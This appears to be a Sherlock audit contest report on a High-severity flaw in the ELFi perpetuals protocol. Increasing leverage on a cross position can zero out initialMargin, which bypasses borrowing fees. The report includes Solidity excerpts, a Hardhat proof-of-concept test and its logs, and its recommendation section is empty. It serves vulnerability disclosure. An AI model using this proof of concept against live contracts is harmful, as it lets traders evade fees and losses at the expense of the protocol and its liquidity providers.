Active Punch Jellyfish

High

# Increasing leverage can make the position have "0" `initialMargin`

## Summary
Increasing the leverage of a cross position can make the position have "0" initialMargin.
## Vulnerability Detail
When position leverage is increased the margin required in USD will decrease since positions QTY is not changing. However, when the margin in terms of token is decreased the current price will be used which can make the `initialMargin` to "0". 

For example, let's assume a position where its 2x SHORT tokenA with 100$ margin where 1 tokenA is 1$. 
Position in beginning:
initialMargin = 100
initialMarginInUsd = 100$
qty = 200$

Say the user wants to levers up to 10x. Reduce margin will be calculated as 100 - 20 = 80 as we can observe in PositionMarginProcess::updatePositionLeverage function's these lines
```solidity
position.leverage = request.leverage;
uint256 reduceMargin = position.initialMarginInUsd - CalUtils.divRate(position.qty, position.leverage);
uint256 reduceMarginAmount = _executeReduceMargin(position, symbolProps, reduceMargin, false);
```
Moving on with the execution of the function we will execute the following lines in the PositionMarginProcess::_executeReduceMargin() internal function:
```solidity
        uint256 marginTokenPrice = OracleProcess.getLatestUsdUintPrice(position.marginToken, !position.isLong);
        uint256 reduceMarginAmount = CalUtils.usdToToken(reduceMargin, decimals, marginTokenPrice);
        if (
            position.isCrossMargin &&
            position.initialMarginInUsd - position.initialMarginInUsdFromBalance < reduceMargin
        ) {
            position.initialMarginInUsdFromBalance -= (reduceMargin -
                (position.initialMarginInUsd - position.initialMarginInUsdFromBalance)).max(0);
        }
        position.initialMargin -= reduceMarginAmount;
        position.initialMarginInUsd -= reduceMargin;
```

As we can observe above, we use the current price. Say the price of tokenA is 0.8$ at the time of updating leverage. `reduceMarginAmount` will be calculated as: 80 / 0.8 = 100 tokens. 
When we reduce this amount from `position.initialMargin` which recall that it was 100 at the beginning, it will be "0". 

When positions initial margin is "0" position no longer pays borrowing fees to pool. Completely bypassing it as we can see how the borrowing fee is calculated here:
https://github.com/sherlock-audit/2024-05-elfi-protocol/blob/8a1a01804a7de7f73a04d794bf6b8104528681ad/elfi-perp-contracts/contracts/process/FeeProcess.sol#L82-L85

**Another case from same root cause:**
Isolated accounts can close a LONG position that is in losses to secure their initial margin back, effectively escalating any losses that are occurred. 

**Coded PoC:**
```typescript
it("Increase leverage and achieve 0 margin", async function () {
		const usdcAm = precision.token(500_000, 6);
		await deposit(fixture, {
			account: user0,
			token: usdc,
			amount: usdcAm,
		});
		///////////////////////////////////////////////////////////////////////////
		///////////////////////////////////////////////////////////////////////////
		// Actual price is 25k
		const oracleBeginning = [
			{
				token: wbtcAddr,
				targetToken: ethers.ZeroAddress,
				minPrice: precision.price(25_000),
				maxPrice: precision.price(25_000),
			},
			{
				token: usdcAddr,
				targetToken: ethers.ZeroAddress,
				minPrice: precision.price(1),
				maxPrice: precision.price(1),
			},
		];
		///////////////////////////////////////////////////////////////////////////
		///////////////////////////////////////////////////////////////////////////
		const orderMargin = precision.token(25_000); // 25k 1 btc$
		const executionFee = precision.token(2, 15);
		const tx = await orderFacet.connect(user0).createOrderRequest(
			{
				symbol: btcUsd,
				orderSide: OrderSide.LONG,
				posSide: PositionSide.INCREASE,
				orderType: OrderType.MARKET,
				stopType: StopType.NONE,
				isCrossMargin: true,
				marginToken: wbtcAddr,
				qty: 0,
				leverage: precision.rate(2),
				triggerPrice: 0,
				acceptablePrice: 0,
				executionFee: executionFee,
				placeTime: 0,
				orderMargin: orderMargin,
				isNativeToken: false,
			},
			{
				value: executionFee,
			}
		);

		await tx.wait();

		const requestId = await marketFacet.getLastUuid(ORDER_ID_KEY);

		await orderFacet.connect(user3).executeOrder(requestId, oracleBeginning);
		///////////////////////////////////////////////////////////////////////////
		///////////////////////////////////////////////////////////////////////////
		let accountInfo = await accountFacet.getAccountInfo(user0.address);
		console.log("account info", accountInfo.tokenBalances);

		let positionInfo = await positionFacet.getSinglePosition(
			user0.address,
			btcUsd,
			wbtcAddr,
			true
		);
		console.log("Position initial margin", positionInfo.initialMargin);
		console.log(
			"Position initial margin in USD",
			positionInfo.initialMarginInUsd
		);
		console.log(
			"Position initial margin from",
			positionInfo.initialMarginInUsdFromBalance
		);
		console.log("Position qty", positionInfo.qty);
		///////////////////////////////////////////////////////////////////////////
		///////////////////////////////////////////////////////////////////////////
		let ptx = await positionFacet.connect(user0).createUpdateLeverageRequest(
			{
				symbol: btcUsd,
				isLong: true,
				isNativeToken: false,
				isCrossMargin: true,
				leverage: precision.rate(10),
				marginToken: wbtcAddr,
				addMarginAmount: precision.token(10),
				executionFee: executionFee,
			},
			{
				value: executionFee,
			}
		);

		const oracleNext = [
			{
				token: wbtcAddr,
				targetToken: ethers.ZeroAddress,
				minPrice: precision.price(20_000),
				maxPrice: precision.price(20_000),
			},
			{
				token: usdcAddr,
				targetToken: ethers.ZeroAddress,
				minPrice: precision.price(1),
				maxPrice: precision.price(1),
			},
		];

		await ptx.wait();

		await positionFacet
			.connect(user3)
			.executeUpdateLeverageRequest(BigInt(1112), oracleNext);
		///////////////////////////////////////////////////////////////////////////
		///////////////////////////////////////////////////////////////////////////

		accountInfo = await accountFacet.getAccountInfo(user0.address);
		console.log("account info", accountInfo.tokenBalances);

		positionInfo = await positionFacet.getSinglePosition(
			user0.address,
			btcUsd,
			wbtcAddr,
			true
		);
		console.log("Position initial margin", positionInfo.initialMargin);
		console.log(
			"Position initial margin from",
			positionInfo.initialMarginInUsdFromBalance
		);
		console.log(
			"Position initial margin in USD",
			positionInfo.initialMarginInUsd
		);
		console.log("Position qty", positionInfo.qty);
	});
```

**Test Logs**:
account info Result(2) [
  Result(4) [ 500000000000n, 0n, 0n, 0n ],
  Result(4) [ 0n, 1000000000000000000n, 0n, 3000000000000000n ]
]
Position initial margin 997000000000000000n
Position initial margin in USD 24925000000000000000000n
Position initial margin from 0n
Position qty 49850000000000000000000n
account info Result(2) [
  Result(4) [ 500000000000n, 0n, 0n, 0n ],
  Result(4) [ 0n, 3000000000000000n, 0n, 3000000000000000n ]
]
**Position initial margin 0n**
**Position initial margin from 0n**
Position initial margin in USD 4985000000000000000000n
Position qty 49850000000000000000000n
## Impact
Most obvious one I found is that the account no longer pays borrowing fees because of multiplication with "0" which is a high by itself alone. Also, please refer to the other case explained in vulnerability details section where isolated order escapes the losses and secures the initial margin.
## Code Snippet
https://github.com/sherlock-audit/2024-05-elfi-protocol/blob/8a1a01804a7de7f73a04d794bf6b8104528681ad/elfi-perp-contracts/contracts/process/PositionMarginProcess.sol#L134-L229

https://github.com/sherlock-audit/2024-05-elfi-protocol/blob/8a1a01804a7de7f73a04d794bf6b8104528681ad/elfi-perp-contracts/contracts/process/PositionMarginProcess.sol#L370-L407
## Tool used

Manual Review

## Recommendation
